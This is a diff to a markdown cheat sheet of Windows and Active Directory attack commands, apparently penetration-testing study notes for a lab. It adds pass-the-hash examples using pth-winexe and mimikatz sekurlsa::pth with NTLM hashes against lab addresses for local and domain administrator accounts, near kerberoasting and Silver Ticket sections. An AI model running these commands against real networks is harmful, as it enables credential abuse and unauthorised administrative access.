@@ -39,12 +39,22 @@ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~
 # Pass the Hash
 
 ## pth-winexe
+- Local account
 ```console
-pth-winexe -U offsec%00000000000000000000000000000000:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
+pth-winexe -U administrator%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
+```
+- Domain account
+```console
+pth-winexe -U LAB/domainadmin%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
 ```
 ## mimikatz - sekurlsa::pth
+- Local account
 ```console
-sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d 87aa966c327 /run:PowerShell.exe
+sekurlsa::pth /user:administrator /domain:* /ntlm:e19ccf75ee54e06b06a5907af13cef42 /run:powershell.exe
+```
+- Domain account
+```console
+sekurlsa::pth /user:domainadmin /domain:lab.vx /ntlm:e19ccf75ee54e06b06a5907af13cef42 /run:powershell.exe
 ```
 
 # Silver Ticket
